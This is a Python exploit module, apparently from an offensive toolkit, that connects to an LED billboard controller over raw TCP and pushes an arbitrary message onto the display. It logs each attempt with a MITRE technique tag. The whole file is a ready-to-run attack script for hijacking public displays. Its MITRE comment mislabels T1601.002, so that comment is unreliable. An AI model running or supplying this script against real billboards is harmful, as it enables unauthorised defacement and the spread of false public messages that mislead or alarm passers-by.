# modules/exploits/billboard_led_override.py

import argparse
import socket
import time
import json
import os
from datetime import datetime

LOG_PATH = "results/exploit_logs.json"
MITRE_TTP = "T1601.002"  # Modify System Image: Display Content

def log_led_event(entry):
    os.makedirs("results", exist_ok=True)
    if os.path.exists(LOG_PATH):
        with open(LOG_PATH, "r") as f:
            data = json.load(f)
    else:
        data = []
    data.append(entry)
    with open(LOG_PATH, "w") as f:
        json.dump(data, f, indent=2)

def override_display(ip, port, message):
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((ip, port))
        s.sendall(message.encode())
        print(f"[âœ“] Message sent to LED billboard at {ip}:{port}")
        s.close()
    except Exception as e:
        print(f"[!] Failed to send message: {e}")
    
    log_led_event({
        "timestamp": datetime.utcnow().isoformat(),
        "target": f"{ip}:{port}",
        "message": message,
        "ttp": MITRE_TTP
    })

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="Override LED Billboard Content")
    parser.add_argument("--ip", required=True, help="Target IP of billboard controller")
    parser.add_argument("--port", type=int, default=5000, help="Control port (default: 5000)")
    parser.add_argument("--message", required=True, help="Message to display")
    args = parser.parse_args()

    override_display(args.ip, args.port, args.message)
